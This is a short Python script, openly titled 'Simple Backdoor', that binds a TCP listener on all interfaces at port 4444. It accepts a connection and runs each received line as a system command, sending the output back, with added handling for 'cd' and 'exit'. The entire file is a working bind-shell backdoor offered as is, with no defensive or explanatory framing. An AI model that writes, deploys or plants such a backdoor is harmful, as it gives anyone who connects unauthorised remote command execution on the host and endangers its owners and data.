import sys, socket, time, re, subprocess, os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4444))
sock.listen(1)
conn,addr = sock.accept()

conn.send(b'== Simple Backdoor Yeah ==\n\n>')
while 1 :
    data = conn.recv(1024)
    cmd = data.strip().split(b' ')
    if cmd[0] == b'cd':
        os.chdir(cmd[1])
    elif cmd[0] in (b'exit'):
        break
    else:
        conn.send(subprocess.check_output(cmd) + b'\n>')
    
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()
